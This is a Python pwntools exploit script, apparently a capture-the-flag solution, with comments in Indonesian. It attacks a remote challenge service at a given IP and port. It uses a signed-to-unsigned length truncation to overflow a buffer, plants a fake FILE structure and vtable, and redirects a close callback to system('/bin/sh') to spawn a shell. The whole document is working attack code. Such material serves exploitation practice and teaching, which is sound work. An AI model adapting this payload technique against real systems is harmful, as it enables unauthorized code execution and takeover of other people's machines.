#!/usr/bin/env python3
from pwn import *

HOST = "15.235.202.47"
PORT = 8996

context.arch = "amd64"
context.log_level = "debug"

BOX = 0x404040
SYSTEM_PLT = 0x401040


def start():
    if args.LOCAL:
        exe = args.EXE or "./chall"
        return process(exe)

    return remote(HOST, PORT)


def build_payload():
    payload = bytearray(255)

    # Fake vtable diletakkan di awal box.
    # custom_fclose mengambil callback kedua dari vtable + 8.
    payload[0x08:0x10] = p64(SYSTEM_PLT)

    # box + 0x50 harus tetap 0 agar lolos safety check.
    payload[0x50:0x54] = p32(0)

    # Fake FILE dimulai pada box + 0x60.
    # Pointer ini diteruskan sebagai argumen pertama callback,
    # jadi system() akan menerima "/bin/sh".
    payload[0x60:0x68] = b"/bin/sh\x00"

    # fake_file + 0x10 dibuat 0 agar masuk jalur callback kedua.
    payload[0x70:0x78] = p64(0)

    # fake_file + 0x48 menunjuk fake vtable di BOX.
    payload[0xA8:0xB0] = p64(BOX)

    return bytes(payload)


def main():
    io = start()

    # Signed check menerima -1 karena -1 <= 80.
    # Nilai kemudian dipotong ke uint8 sehingga menjadi 255.
    io.sendlineafter(b"buffer:", b"-1")

    payload = build_payload()
    assert len(payload) == 255

    io.sendafter(b"> \n", payload)

    log.success("Shell spawned")
    io.interactive()


if __name__ == "__main__":
    main()
